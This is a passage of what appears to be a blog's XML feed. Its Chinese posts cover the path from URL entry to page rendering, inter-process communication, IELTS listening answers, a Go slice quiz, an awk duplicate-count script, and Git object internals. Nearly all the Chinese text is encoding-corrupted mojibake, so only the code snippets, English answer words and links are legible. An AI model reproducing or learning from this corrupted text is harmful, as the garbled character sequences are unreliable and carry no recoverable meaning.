        <content type="html"><![CDATA[<p><img src="https://snowgo.top/medias/medias/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%9C%B0%E5%9D%80%E6%A0%8F%E8%BE%93%E5%85%A5URL%E6%95%B2%E4%B8%8B%E5%9B%9E%E8%BD%A6%E5%90%8E%E5%8F%91%E7%94%9F%E4%BA%86%E4%BB%80%E4%B9%88/0.png"></p><h2 id="ä¸€ã€ç®€å•åˆ†æ"><a href="#ä¸€ã€ç®€å•åˆ†æ" class="headerlink" title="ä¸€ã€ç®€å•åˆ†æ"></a>ä¸€ã€ç®€å•åˆ†æ</h2><p>ç®€å•çš„åˆ†æï¼Œä»è¾“å…¥ URLåˆ°å›è½¦åå‘ç”Ÿçš„è¡Œä¸ºå¦‚ä¸‹ï¼š</p><ol><li>URLè§£æ</li><li>DNS æŸ¥è¯¢</li><li>TCP è¿æ¥</li><li>HTTP è¯·æ±‚</li><li>å“åº”è¯·æ±‚</li><li>é¡µé¢æ¸²æŸ“<h2 id="äºŒã€è¯¦ç»†åˆ†æ"><a href="#äºŒã€è¯¦ç»†åˆ†æ" class="headerlink" title="äºŒã€è¯¦ç»†åˆ†æ"></a>äºŒã€è¯¦ç»†åˆ†æ</h2><h3 id="URLè§£æ"><a href="#URLè§£æ" class="headerlink" title="URLè§£æ"></a>URLè§£æ</h3>é¦–å…ˆåˆ¤æ–­ä½ è¾“å…¥çš„æ˜¯ä¸€ä¸ªåˆæ³•çš„URL è¿˜æ˜¯ä¸€ä¸ªå¾…æœç´¢çš„å…³é”®è¯ï¼Œå¹¶ä¸”æ ¹æ®ä½ è¾“å…¥çš„å†…å®¹è¿›è¡Œå¯¹åº”æ“ä½œ<br>ä¸€ä¸ªurlçš„ç»“æ„è§£æå¦‚ä¸‹ï¼š<br><img src="https://snowgo.top/medias/medias/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%9C%B0%E5%9D%80%E6%A0%8F%E8%BE%93%E5%85%A5URL%E6%95%B2%E4%B8%8B%E5%9B%9E%E8%BD%A6%E5%90%8E%E5%8F%91%E7%94%9F%E4%BA%86%E4%BB%80%E4%B9%88/1.png"><h3 id="DNSæŸ¥è¯¢"><a href="#DNSæŸ¥è¯¢" class="headerlink" title="DNSæŸ¥è¯¢"></a>DNSæŸ¥è¯¢</h3>åœ¨DNSåè®®ä¸­è®²è¿‡DNSçš„æŸ¥è¯¢ï¼Œè¿™é‡Œå°±ä¸å†è®²è¿°äº†<br>æ•´ä¸ªæŸ¥è¯¢è¿‡ç¨‹å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š<br><img src="https://snowgo.top/medias/medias/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%9C%B0%E5%9D%80%E6%A0%8F%E8%BE%93%E5%85%A5URL%E6%95%B2%E4%B8%8B%E5%9B%9E%E8%BD%A6%E5%90%8E%E5%8F%91%E7%94%9F%E4%BA%86%E4%BB%80%E4%B9%88/2.png"><br>æœ€ç»ˆï¼Œè·å–åˆ°äº†åŸŸåå¯¹åº”çš„ç›®æ ‡æœåŠ¡å™¨IPåœ°å€<h3 id="TCPè¿æ¥"><a href="#TCPè¿æ¥" class="headerlink" title="TCPè¿æ¥"></a>TCPè¿æ¥</h3>åœ¨ç†è§£TCPä¸­ï¼Œäº†è§£åˆ°tcpæ˜¯ä¸€ç§é¢å‘æœ‰è¿æ¥çš„ä¼ è¾“å±‚åè®®<br>åœ¨ç¡®å®šç›®æ ‡æœåŠ¡å™¨æœåŠ¡å™¨çš„IPåœ°å€åï¼Œåˆ™ç»å†ä¸‰æ¬¡æ¡æ‰‹å»ºç«‹TCPè¿æ¥ï¼Œæµç¨‹å¦‚ä¸‹ï¼š<br><img src="https://snowgo.top/medias/medias/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%9C%B0%E5%9D%80%E6%A0%8F%E8%BE%93%E5%85%A5URL%E6%95%B2%E4%B8%8B%E5%9B%9E%E8%BD%A6%E5%90%8E%E5%8F%91%E7%94%9F%E4%BA%86%E4%BB%80%E4%B9%88/3.png"><h3 id="å‘é€-http-è¯·æ±‚"><a href="#å‘é€-http-è¯·æ±‚" class="headerlink" title="å‘é€ http è¯·æ±‚"></a>å‘é€ http è¯·æ±‚</h3>å½“å»ºç«‹tcpè¿æ¥ä¹‹åï¼Œå°±å¯ä»¥åœ¨è¿™åŸºç¡€ä¸Šè¿›è¡Œé€šä¿¡ï¼Œæµè§ˆå™¨å‘é€ http è¯·æ±‚åˆ°ç›®æ ‡æœåŠ¡å™¨<br>è¯·æ±‚çš„å†…å®¹åŒ…æ‹¬ï¼š<br>è¯·æ±‚è¡Œè¯·æ±‚å¤´è¯·æ±‚ä¸»ä½“<br><img src="https://snowgo.top/medias/medias/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%9C%B0%E5%9D%80%E6%A0%8F%E8%BE%93%E5%85%A5URL%E6%95%B2%E4%B8%8B%E5%9B%9E%E8%BD%A6%E5%90%8E%E5%8F%91%E7%94%9F%E4%BA%86%E4%BB%80%E4%B9%88/4.png"><h3 id="å“åº”è¯·æ±‚"><a href="#å“åº”è¯·æ±‚" class="headerlink" title="å“åº”è¯·æ±‚"></a>å“åº”è¯·æ±‚</h3>å½“æœåŠ¡å™¨æ¥æ”¶åˆ°æµè§ˆå™¨çš„è¯·æ±‚ä¹‹åï¼Œå°±ä¼šè¿›è¡Œé€»è¾‘æ“ä½œï¼Œå¤„ç†å®Œæˆä¹‹åè¿”å›ä¸€ä¸ªHTTPå“åº”æ¶ˆæ¯ï¼ŒåŒ…æ‹¬ï¼š<br>çŠ¶æ€è¡Œå“åº”å¤´å“åº”æ­£æ–‡<br><img src="https://snowgo.top/medias/medias/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%9C%B0%E5%9D%80%E6%A0%8F%E8%BE%93%E5%85%A5URL%E6%95%B2%E4%B8%8B%E5%9B%9E%E8%BD%A6%E5%90%8E%E5%8F%91%E7%94%9F%E4%BA%86%E4%BB%80%E4%B9%88/5.png"><br>åœ¨æœåŠ¡å™¨å“åº”ä¹‹åï¼Œç”±äºç°åœ¨httpé»˜è®¤å¼€å§‹é•¿è¿æ¥keep-aliveï¼Œå½“é¡µé¢å…³é—­ä¹‹åï¼Œtcpé“¾æ¥åˆ™ä¼šç»è¿‡å››æ¬¡æŒ¥æ‰‹å®Œæˆæ–­å¼€<h3 id="é¡µé¢æ¸²æŸ“"><a href="#é¡µé¢æ¸²æŸ“" class="headerlink" title="é¡µé¢æ¸²æŸ“"></a>é¡µé¢æ¸²æŸ“</h3>å½“æµè§ˆå™¨æ¥æ”¶åˆ°æœåŠ¡å™¨å“åº”çš„èµ„æºåï¼Œé¦–å…ˆä¼šå¯¹èµ„æºè¿›è¡Œè§£æï¼š<br>æŸ¥çœ‹å“åº”å¤´çš„ä¿¡æ¯ï¼Œæ ¹æ®ä¸åŒçš„æŒ‡ç¤ºåšå¯¹åº”å¤„ç†ï¼Œæ¯”å¦‚é‡å®šå‘ï¼Œå­˜å‚¨cookieï¼Œè§£å‹gzipï¼Œç¼“å­˜èµ„æºç­‰ç­‰æŸ¥çœ‹å“åº”å¤´çš„ Content-Typeçš„å€¼ï¼Œæ ¹æ®ä¸åŒçš„èµ„æºç±»å‹é‡‡ç”¨ä¸åŒçš„è§£ææ–¹å¼å…³äºé¡µé¢çš„æ¸²æŸ“è¿‡ç¨‹å¦‚ä¸‹ï¼š<br>è§£æHTMLï¼Œæ„å»º DOM æ ‘è§£æ CSS ï¼Œç”Ÿæˆ CSS è§„åˆ™æ ‘åˆå¹¶ DOM æ ‘å’Œ CSS è§„åˆ™ï¼Œç”Ÿæˆ render æ ‘å¸ƒå±€ render æ ‘ï¼ˆ Layout / reflow ï¼‰ï¼Œè´Ÿè´£å„å…ƒç´ å°ºå¯¸ã€ä½ç½®çš„è®¡ç®—ç»˜åˆ¶ render æ ‘ï¼ˆ paint ï¼‰ï¼Œç»˜åˆ¶é¡µé¢åƒç´ ä¿¡æ¯æµè§ˆå™¨ä¼šå°†å„å±‚çš„ä¿¡æ¯å‘é€ç»™ GPUï¼ŒGPU ä¼šå°†å„å±‚åˆæˆï¼ˆ composite ï¼‰ï¼Œæ˜¾ç¤ºåœ¨å±å¹•ä¸Š<br><img src="https://snowgo.top/medias/medias/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%9C%B0%E5%9D%80%E6%A0%8F%E8%BE%93%E5%85%A5URL%E6%95%B2%E4%B8%8B%E5%9B%9E%E8%BD%A6%E5%90%8E%E5%8F%91%E7%94%9F%E4%BA%86%E4%BB%80%E4%B9%88/6.png"><blockquote><p>å‚è€ƒæ–‡çŒ®<br><a href="https://github.com/febobo/web-interview/issues/141https://zhuanlan.zhihu.com/p/80551769">https://github.com/febobo/web-interview/issues/141https://zhuanlan.zhihu.com/p/80551769</a><br><a href="https://baijiahao.baidu.com/s?id=1707485335576146048&wfr=spider&for=pc">https://baijiahao.baidu.com/s?id=1707485335576146048&amp;wfr=spider&amp;for=pc</a></p></blockquote></li></ol>]]></content>
      
      
      <categories>
          
          <category> é—®é¢˜å’ŒæŠ€å·§ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> è®¡ç®—æœºç½‘ç»œ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>è¿›ç¨‹é—´é€šä¿¡æ–¹å¼</title>
      <link href="/2022/04/24/%E8%BF%9B%E7%A8%8B%E9%97%B4%E9%80%9A%E4%BF%A1%E6%96%B9%E5%BC%8F/"/>
      <url>/2022/04/24/%E8%BF%9B%E7%A8%8B%E9%97%B4%E9%80%9A%E4%BF%A1%E6%96%B9%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<p><strong>åŒä¸€ä¸ªè¿›ç¨‹ä¸­çš„çº¿ç¨‹å…±äº«æ•°æ®ç©ºé—´å¯ä»¥ç›´æ¥é€šä¿¡ï¼Œä½†æ˜¯è¿›ç¨‹é—´æ˜¯æ— æ³•ç›´æ¥è¿›è¡Œé€šä¿¡çš„ã€‚</strong><br>è¿›ç¨‹é—´é€šä¿¡ï¼š</p><ol><li>ç®¡é“æ¨¡å‹ï¼šæ¯”å¦‚cat xx.txt | grep -n â€˜xxxâ€™ è¿™ä¸ªâ€™|â€™å¯ä»¥çœ‹ä½œä¸€ä¸ªå•å‘çš„åŒ¿åç®¡é“ï¼Œä½¿å¾—å‰åä¸¤ä¸ªè¿›ç¨‹ä¹‹é—´è¿›è¡Œé€šä¿¡ï¼Œå‰ä¸€ä¸ªå‘½åçš„è¾“å‡ºä½œä¸ºåä¸€ä¸ªå‘½ä»¤çš„è¾“å…¥ï¼Œè¯¥ç®¡é“ä½¿ç”¨ç»“æŸåˆ™ç«‹å³é”€æ¯ã€‚å‘½åç®¡é“åœ¨linuxä¸­ä»¥æ–‡ä»¶çš„å½¢å¼å­˜åœ¨ï¼Œåªè¦è®¿é—®è¯¥æ–‡ä»¶å°±å¯ä»¥å®ç°ä»»æ„ä¸¤ä¸ªè¿›ç¨‹é—´çš„é€šä¿¡ï¼Œå‘½åç®¡é“å¯ä»¥çœ‹ä½œæ˜¯æ˜¯ç¡¬ç›˜ä¸Šå­˜åœ¨çš„è®¾å¤‡æ–‡ä»¶ï¼Œæ‰€ä»¥æ‰“å¼€éœ€è¦ä½¿ç”¨openã€‚</li><li>æ¶ˆæ¯é˜Ÿåˆ—æ¨¡å‹ï¼šæ¯”å¦‚ç”Ÿäº§è€…æ¶ˆè´¹è€…æ¨¡å¼ï¼Œä¸€ç«¯ç”Ÿäº§ä¸€ç«¯æ¶ˆè´¹æ•°æ®ã€‚éµå¾ªä¸¥æ ¼çš„å…ˆè¿›å…ˆå‡ºã€‚</li><li>å…±äº«å†…å­˜ï¼šå¤šç”¨äºä¼ è¾“ä¸€äº›å¤§æ–‡ä»¶ï¼Œå¦‚æœé‡‡ç”¨ç®¡é“æˆ–è€…æ¶ˆæ¯é˜Ÿåˆ—ä¼ è¾“å¤§æ–‡ä»¶ï¼Œæ¶‰åŠåˆ°é‡å¤æ‹·è´ï¼Œæ¯”è¾ƒæ¶ˆè€—æ€§èƒ½ï¼Œå› æ­¤æ¨¡æ‹Ÿå¤šçº¿ç¨‹ï¼Œåœ¨å†…å­˜ä¸­å¼€è¾Ÿä¸€å—ç‰¹æ®Šçš„å†…å­˜ç”¨äºå¤šä¸ªè¿›ç¨‹å…±äº«è®¿é—®ã€‚<strong>ä¹Ÿæ˜¯è¿›ç¨‹é—´æœ€é«˜æ•ˆçš„é€šä¿¡æ–¹å¼</strong>ã€‚ä¸€èˆ¬è¦æ­é…ä¿¡å·é‡æœºåˆ¶ã€‚</li><li>ä¿¡å·é‡æœºåˆ¶ï¼šä¿¡å·é‡å¯ä»¥çœ‹ä½œä¸€ç§æ•°æ®æ“ä½œé”ï¼Œé€šè¿‡å¯¹ä¸´ç•Œèµ„æºçš„æ§åˆ¶è®¿é—®ä»¥ç®¡ç†è¿›ç¨‹ä¹‹é—´çš„é€šä¿¡ï¼ŒPVåŸè¯­æ“ä½œã€‚</li><li>socketï¼šç”¨äºå¤šä¸ªè¿›ç¨‹ä¹‹é—´çš„ç½‘ç»œä¼ è¾“ã€‚å¯ä»¥æ˜¯å•æœºå¤šè¿›ç¨‹ä¹Ÿå¯ä»¥æ˜¯ä¸åŒæœºå™¨ä¸Šçš„å¤šè¿›ç¨‹é€šä¿¡ã€‚æ‰“å¼€çš„socketåœ¨linuxä¸‹ä¹Ÿæ˜¯ä»¥æ–‡ä»¶æè¿°ç¬¦fdå­˜åœ¨ã€‚æœåŠ¡ç«¯åˆ›å»ºå¥—æ¥å­—ï¼Œç»‘å®šipç«¯å£ï¼Œç›‘å¬ç«¯å£å·ï¼Œç­‰å¾…å®¢æˆ·ç«¯è°ƒç”¨ï¼Œå®¢æˆ·ç«¯åˆ›å»ºä¹‹åä¸æœåŠ¡ç«¯TCPä¸‰æ¬¡æ¡æ‰‹å»ºç«‹è¿æ¥å®Œæˆï¼ŒåŒæ–¹å°±å¯ä»¥å‘é€å’Œæ¥æ”¶æ•°æ®ï¼Œä½¿ç”¨é¢‘ç‡å°‘ã€‚</li></ol>]]></content>
      
      
      <categories>
          
          <category> é—®é¢˜å’ŒæŠ€å·§ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ“ä½œç³»ç»Ÿ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IELTSå¬åŠ›ç¬”è®°-1</title>
      <link href="/2022/04/21/IELTS%E5%90%AC%E5%8A%9B%E7%AC%94%E8%AE%B0-1/"/>
      <url>/2022/04/21/IELTS%E5%90%AC%E5%8A%9B%E7%AC%94%E8%AE%B0-1/</url>
      
        <content type="html"><![CDATA[<h2 id="é¢˜æº"><a href="#é¢˜æº" class="headerlink" title="é¢˜æº"></a>é¢˜æº</h2><p>æ¥è‡ªäº2003-2019å¹´æ—§é¢˜ç›®<br>é…åˆç”¨ä¹¦ï¼š<br><a href="https://zh.book4you.org/book/16739252/bae745">https://zh.book4you.org/book/16739252/bae745</a><br><img src="https://snowgo.top/medias/medias/IELTS%E5%90%AC%E5%8A%9B%E7%AC%94%E8%AE%B0-1/0.png"><br><strong>è¯­æ–™åº“é‡ç‚¹ç« èŠ‚ï¼š11ç« +5ç« +3ç« +4ç« </strong><br>é›…æ€å› ç–«æƒ…åŸå› ä¸€ç›´æ²¡æœ‰å‡ºæ–°é¢˜<br>æ²¡æœ‰å¿…è¦çœ‹bbc<br>æ€»åˆ†åˆ†æ•°å¯¹åº”ï¼š<br><img src="https://snowgo.top/medias/medias/IELTS%E5%90%AC%E5%8A%9B%E7%AC%94%E8%AE%B0-1/1.png"><br>å¬åŠ›åˆ†æ•°å¯¹åº”ï¼š<br><img src="https://snowgo.top/medias/medias/IELTS%E5%90%AC%E5%8A%9B%E7%AC%94%E8%AE%B0-1/2.png"><br><img src="https://snowgo.top/medias/medias/IELTS%E5%90%AC%E5%8A%9B%E7%AC%94%E8%AE%B0-1/3.png"><br>æåˆ†è€—æ—¶ï¼š<br><img src="https://snowgo.top/medias/medias/IELTS%E5%90%AC%E5%8A%9B%E7%AC%94%E8%AE%B0-1/4.png"><br>ç›®æ ‡7åˆ† = 8888 = 8778 = 9768<br>ä¸¤ç‚¹æ³¨æ„ï¼š</p><ul><li>æ²¡è¯´ now turn to section 1 ä¸èƒ½ç¿»ä¹¦</li><li>å¬åˆ°stop writing å¿…é¡»åœç¬”<h2 id="ç»ƒä¹ "><a href="#ç»ƒä¹ " class="headerlink" title="ç»ƒä¹ "></a>ç»ƒä¹ </h2><h3 id="Test5"><a href="#Test5" class="headerlink" title="Test5"></a>Test5</h3><div class="audio"><audio controls preload><source src='https://snowgo.top/medias/%E9%9B%85%E6%80%9D/%E5%89%9112%E5%90%AC%E5%8A%9B%E9%9F%B3%E9%A2%91/%E3%80%90%E6%A8%B1%E8%8A%B1%E8%AE%BA%E5%9D%9B%20www.sakuraaaa.com%E3%80%91IELTS%2012%20Test%205_S1.mp3' type='audio/mp3'>Your browser does not support the audio tag.</audio></div><img src="https://snowgo.top/medias/medias/IELTS%E5%90%AC%E5%8A%9B%E7%AC%94%E8%AE%B0-1/5.png"><br><img src="https://snowgo.top/medias/medias/IELTS%E5%90%AC%E5%8A%9B%E7%AC%94%E8%AE%B0-1/6.png"><br><img src="https://snowgo.top/medias/medias/IELTS%E5%90%AC%E5%8A%9B%E7%AC%94%E8%AE%B0-1/7.png"><h4 id="æŠ„å†™ç­”é¢˜çº¸è¦æ±‚"><a href="#æŠ„å†™ç­”é¢˜çº¸è¦æ±‚" class="headerlink" title="æŠ„å†™ç­”é¢˜çº¸è¦æ±‚"></a>æŠ„å†™ç­”é¢˜çº¸è¦æ±‚</h4><img src="https://snowgo.top/medias/medias/IELTS%E5%90%AC%E5%8A%9B%E7%AC%94%E8%AE%B0-1/8.png"><br>æ—¥æœŸä¸ç”¨åŠ thï¼Œéè¦åŠ çš„è¯è¦è¿™ä¹ˆåŠ ï¼š<br><img src="https://snowgo.top/medias/medias/IELTS%E5%90%AC%E5%8A%9B%E7%AC%94%E8%AE%B0-1/9.png"><br>ä¸–çºªå¿…é¡»åºæ•°è¯ï¼š<br><img src="https://snowgo.top/medias/medias/IELTS%E5%90%AC%E5%8A%9B%E7%AC%94%E8%AE%B0-1/10.png"></li></ul><p><strong>å°¾æ•°ä¸º1-3çš„ï¼ˆé™¤äº†11,12,13ï¼‰éƒ½æ¯”è¾ƒç‰¹æ®Šï¼Œå…¶ä»–éƒ½æ˜¯th</strong><br>æ˜“é”™æ—¥æœŸå•è¯ï¼š<br><code>**February April August November September Wednesday Thursday Saturday**</code></p><h4 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h4><p>é¦–å…ˆè¦å®¡é¢˜ï¼šWrite ONE WORD AND/ORA NUMBER for each answer<br>åšå®Œç¬¬å››é¢˜å°±ç»§ç»­å»å®¡åé¢é¢˜äº†<br>ç¬¬8é¢˜æ˜¯æœ€éš¾çš„</p><h4 id="ç­”æ¡ˆ"><a href="#ç­”æ¡ˆ" class="headerlink" title="ç­”æ¡ˆ"></a>ç­”æ¡ˆ</h4><p>1ï¼š<br><img src="https://snowgo.top/medias/medias/IELTS%E5%90%AC%E5%8A%9B%E7%AC%94%E8%AE%B0-1/11.png"><br>2ï¼š<br>ride = trek = å¾’æ­¥æ—…è¡Œ<br><img src="https://snowgo.top/medias/medias/IELTS%E5%90%AC%E5%8A%9B%E7%AC%94%E8%AE%B0-1/12.png"><br>è‹±éŸ³éš¾å¬æ‡‚<br><code>camel donkey crocodile</code><br>3:<br><img src="https://snowgo.top/medias/medias/IELTS%E5%90%AC%E5%8A%9B%E7%AC%94%E8%AE%B0-1/13.png"><br>è®°å¾—åŠ s<br>4ï¼š<br>lunch<br>è¡¥å……ï¼š<br><code>meals breakfast lunch dinner brunch</code><br><code>extra cost basic cost</code><br>5:<br>map<br>è¡¥å……ï¼š<br>mat ï¼šåœ°å«<br>6:<br>experience<br>æ³¨æ„ï¼š<br><img src="https://snowgo.top/medias/medias/IELTS%E5%90%AC%E5%8A%9B%E7%AC%94%E8%AE%B0-1/14.png"><br>7:<br>Ratchesons<br>å¤§å°å†™éƒ½è¡Œ<br>8ï¼š<br>helmetï¼šå¤´ç›”â›‘<br>9ï¼š<br>shops<br>10ï¼š<br>267<br>è¯­æ–™åº“ç¬¬8ç« å¯ä»¥ç»ƒæ•°å­—ï¼ˆæœ€åæ²¡äº‹äº†å†ç»ƒï¼‰</p><h3 id="Test8"><a href="#Test8" class="headerlink" title="Test8"></a>Test8</h3><div class="audio"><audio controls preload><source src='https://snowgo.top/medias/%E9%9B%85%E6%80%9D/%E5%89%9112%E5%90%AC%E5%8A%9B%E9%9F%B3%E9%A2%91/%E3%80%90%E6%A8%B1%E8%8A%B1%E8%AE%BA%E5%9D%9B%20www.sakuraaaa.com%E3%80%91IELTS%2012%20Test%208_S1.mp3' type='audio/mp3'>Your browser does not support the audio tag.</audio></div><p><img src="https://snowgo.top/medias/medias/IELTS%E5%90%AC%E5%8A%9B%E7%AC%94%E8%AE%B0-1/15.png"><br><img src="https://snowgo.top/medias/medias/IELTS%E5%90%AC%E5%8A%9B%E7%AC%94%E8%AE%B0-1/16.png"></p><h4 id="ç­”æ¡ˆ-1"><a href="#ç­”æ¡ˆ-1" class="headerlink" title="ç­”æ¡ˆ"></a>ç­”æ¡ˆ</h4><p>æˆ‘çš„ç­”æ¡ˆï¼š<br><code>~~tempray~~ doctor africa ~~cycling~~ may cheese arbuthnot dg74ph ~~monday~~ talk</code></p><p>æ­£ç¡®ç­”æ¡ˆï¼š<br><code>temporary doctor Africa youth May Arbuthnot dg74ph Tuesday talk</code> </p><blockquote><p>å¤§å°å†™éƒ½è¡Œ</p></blockquote><p>è¡¥å……ï¼š<br>permanent Antarctica helmet</p>]]></content>
      
      
      <categories>
          
          <category> æŠ€æœ¯æ ˆ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> IELTS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>goè¯­è¨€sliceæ‰©å®¹ä¾‹é¢˜</title>
      <link href="/2022/04/20/go%E8%AF%AD%E8%A8%80slice%E6%89%A9%E5%AE%B9%E4%BE%8B%E9%A2%98/"/>
      <url>/2022/04/20/go%E8%AF%AD%E8%A8%80slice%E6%89%A9%E5%AE%B9%E4%BE%8B%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<h2 id="ä¸‹é¢ä»£ç è¾“å‡ºä»€ä¹ˆ"><a href="#ä¸‹é¢ä»£ç è¾“å‡ºä»€ä¹ˆ" class="headerlink" title="ä¸‹é¢ä»£ç è¾“å‡ºä»€ä¹ˆ"></a>ä¸‹é¢ä»£ç è¾“å‡ºä»€ä¹ˆ</h2><p><img src="https://snowgo.top/medias/medias/go%E8%AF%AD%E8%A8%80slice%E6%89%A9%E5%AE%B9%E4%BE%8B%E9%A2%98/2.png"></p><hr><h2 id="ç­”æ¡ˆ"><a href="#ç­”æ¡ˆ" class="headerlink" title="ç­”æ¡ˆ"></a>ç­”æ¡ˆ</h2><p>å› ä¸ºxçš„capä¸º3ï¼Œyå’ŒxæŒ‡å‘åŒä¸€ä¸ªåº•å±‚æ•°ç»„ï¼Œæ‰€ä»¥yçš„å®¹é‡ä¹Ÿä¸º3ï¼Œå¯¹yç»§ç»­appendä¹‹åyå‘ç”Ÿæ‰©å®¹äº†ï¼Œäºæ˜¯æŒ‡å‘çš„åº•å±‚æ•°ç»„å°±å’Œxä¸ä¸€æ ·äº†ã€‚<br><img src="https://snowgo.top/medias/medias/go%E8%AF%AD%E8%A8%80slice%E6%89%A9%E5%AE%B9%E4%BE%8B%E9%A2%98/3.png"></p>]]></content>
      
      
      <categories>
          
          <category> é—®é¢˜å’ŒæŠ€å·§ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> go </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>shellç³»åˆ—é¢˜ä¹‹ç¬¬äºŒåˆ—æ˜¯å¦æœ‰é‡å¤</title>
      <link href="/2022/04/14/shell%E7%B3%BB%E5%88%97%E9%A2%98%E4%B9%8B%E7%AC%AC%E4%BA%8C%E5%88%97%E6%98%AF%E5%90%A6%E6%9C%89%E9%87%8D%E5%A4%8D/"/>
      <url>/2022/04/14/shell%E7%B3%BB%E5%88%97%E9%A2%98%E4%B9%8B%E7%AC%AC%E4%BA%8C%E5%88%97%E6%98%AF%E5%90%A6%E6%9C%89%E9%87%8D%E5%A4%8D/</url>
      
        <content type="html"><![CDATA[<h2 id="æè¿°"><a href="#æè¿°" class="headerlink" title="æè¿°"></a>æè¿°</h2><p>ç»™å®šä¸€ä¸ª nowcoder.txtæ–‡ä»¶ï¼Œå…¶ä¸­æœ‰3åˆ—ä¿¡æ¯ï¼Œå¦‚ä¸‹å®ä¾‹ï¼Œç¼–å†™ä¸€ä¸ªshellè„šæœ¬æ¥æ£€æŸ¥æ–‡ä»¶ç¬¬äºŒåˆ—æ˜¯å¦æœ‰é‡å¤ï¼Œä¸”æœ‰å‡ ä¸ªé‡å¤ï¼Œå¹¶æå–å‡ºé‡å¤çš„è¡Œçš„ç¬¬äºŒåˆ—ä¿¡æ¯ï¼š<br>å®ä¾‹ï¼š</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">20201001 python 99</span><br><span class="line">20201002 go 80</span><br><span class="line">20201002 c++ 88</span><br><span class="line">20201003 php 77</span><br><span class="line">20201001 go 88</span><br><span class="line">20201005 shell 89</span><br><span class="line">20201006 java 70</span><br><span class="line">20201008 c 100</span><br><span class="line">20201007 java 88</span><br><span class="line">20201006 go 97</span><br></pre></td></tr></table></figure><p>ç»“æœï¼š</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">2 java</span><br><span class="line">3 go</span><br></pre></td></tr></table></figure><h2 id="é¢˜è§£"><a href="#é¢˜è§£" class="headerlink" title="é¢˜è§£"></a>é¢˜è§£</h2><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">awk &#x27;&#123;a[$2]+=1&#125;END&#123;for(x in a)&#123;if(a[x]&gt;1) print a[x],x&#125;&#125;&#x27; nowcoder.txt</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> é—®é¢˜å’ŒæŠ€å·§ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> shell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€ŠGitè§£å¯†ã€‹ç¬”è®°â€”â€”è®¤è¯†Gitå¯¹è±¡</title>
      <link href="/2022/04/14/%E3%80%8AGit%E8%A7%A3%E5%AF%86%E3%80%8B%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94%E8%AE%A4%E8%AF%86Git%E5%AF%B9%E8%B1%A1/"/>
      <url>/2022/04/14/%E3%80%8AGit%E8%A7%A3%E5%AF%86%E3%80%8B%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94%E8%AE%A4%E8%AF%86Git%E5%AF%B9%E8%B1%A1/</url>
      
        <content type="html"><![CDATA[<h2 id="è®¤è¯†Gitå¯¹è±¡"><a href="#è®¤è¯†Gitå¯¹è±¡" class="headerlink" title="è®¤è¯†Gitå¯¹è±¡"></a>è®¤è¯†Gitå¯¹è±¡</h2><p>åœ¨Gitçš„ä¸–ç•Œé‡Œï¼ŒGitæŠŠå®ƒæ‰€ç®¡ç†çš„ä¸€åˆ‡å†…å®¹éƒ½å½“ä½œäº†ä¸€ä¸ªä¸ªçš„Gitå¯¹è±¡ï¼ˆGit objectï¼‰ï¼Œè¿™äº›å¯¹è±¡å°±è¢«ä¿å­˜åœ¨.gitç›®å½•ä¸‹ã€‚<strong>Gitåœ¨ä¿å­˜è¿™äº›å¯¹è±¡æ—¶ï¼Œè¿˜ä¼šä¸ºå®ƒä»¬ç”Ÿæˆä¸€ä¸ªåŸºäºSHA-1ç®—æ³•çš„å…¨å±€å”¯ä¸€çš„hashå€¼ï¼Œä»¥ä¾¿åé¢åˆ©ç”¨è¿™ä¸ªhashå€¼å¯¹Gitå¯¹è±¡è¿›è¡Œå­˜å–å’Œå¼•ç”¨ã€‚</strong><br>æ‰€ä»¥ï¼ŒGitçš„æ ¸å¿ƒï¼Œå…¶å®å°±æ˜¯ä¸€ä¸ªåŸºäºæ–‡ä»¶ç³»ç»Ÿçš„ï¼Œå­˜å‚¨â€œé”®å€¼å¯¹â€çš„æ•°æ®åº“ã€‚<br>åŸºäºè¿™ä¸€è®¤è¯†ï¼Œæˆ‘ä»¬å†å›è¿‡å¤´æ¥çœ‹.gitç›®å½•ä¸‹çš„è¿™ä¸¤ä¸ªç›®å½•å’Œä¸€ä¸ªæ–‡ä»¶ï¼š</p><ul><li>objects: é¡¾åæ€ä¹‰ï¼Œè¿™ä¸ªç›®å½•é‡Œå­˜çš„éƒ½æ˜¯Gitå¯¹è±¡ã€‚å®ƒä»¥Gitå¯¹è±¡çš„å½¢å¼ä¿å­˜äº†è¯¥Gitåº“æ‰€åŒ…å«å’Œç®¡ç†çš„å…¨éƒ¨å†…å®¹ï¼›</li><li>refs: 